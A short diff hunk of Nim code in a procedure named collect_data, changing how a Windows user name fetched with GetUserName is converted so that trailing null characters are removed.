@@ -84,7 +84,7 @@ proc collect_data(): bool =
         var username_c: array[256, TCHAR]
         var username_c_len: DWORD = 256
         GetUserName(addr username_c[0], addr username_c_len)
-        username = $username_c.mapIt(it.chr).join()
+        username = $username_c.mapIt(it.chr).join().replace("\x00", "")
     except:
         username = could_not_retrieve
     try:
